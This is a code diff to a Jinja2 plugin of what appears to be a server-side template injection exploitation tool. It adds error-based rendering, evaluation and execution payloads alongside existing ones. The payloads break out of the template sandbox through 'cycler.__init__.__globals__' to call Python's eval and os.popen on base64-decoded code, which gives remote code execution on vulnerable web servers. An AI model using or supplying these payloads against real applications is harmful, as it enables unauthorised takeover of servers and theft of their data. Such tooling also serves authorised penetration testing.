@@ -27,6 +27,13 @@ class Jinja2(python.Python):
                 'test_render': f'{{{{({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|e}}}}',
                 'test_render_expected': f'{(rand.randints[0],rand.randints[1]*rand.randints[2])}'
             },
+            'render_error': {
+                'render': '{code}',
+                'header': '{{{{ cycler.__init__.__globals__.__builtins__.getattr("", (({header[0]}+{header[1]})|string)+(',
+                'trailer': '|string)+(({trailer[0]}+{trailer[1]})|string))}}}}',
+                'test_render': f'({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|e',
+                'test_render_expected': f'{(rand.randints[0], rand.randints[1] * rand.randints[2])}'
+            },
             'evaluate': {
                 'call': 'render',
                 'evaluate': """{{{{cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode())}}}}"""
@@ -34,6 +41,12 @@ class Jinja2(python.Python):
             'execute': {
                 'call': 'render',
                 'execute': """{{{{cycler.__init__.__globals__.os.popen('$(echo "{code_b64p}"|base64 -d)').read()}}}}"""
+            },
+            'evaluate_error': {
+                'evaluate': """cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).rstrip()"""
+            },
+            'execute_error': {
+                'execute': """cycler.__init__.__globals__.os.popen('$(echo "{code_b64p}"|base64 -d)').read().rstrip()"""
             },
             'execute_blind': {
                 'call': 'inject',
